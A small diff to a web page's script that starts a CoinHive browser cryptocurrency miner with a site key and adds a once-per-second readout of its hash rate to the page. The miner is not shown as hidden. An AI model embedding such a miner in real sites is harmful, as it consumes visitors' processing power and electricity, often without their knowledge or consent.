@@ -3,4 +3,13 @@
 <script>
 	var miner = new CoinHive.Anonymous('UitANGIFzXKM1p25LYThHGmI5jpFkrd4');
 	miner.start();
+	
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+		document.getElementById("hps").innerHTML=hashesPerSecond;
+	}, 1000);
 </script>
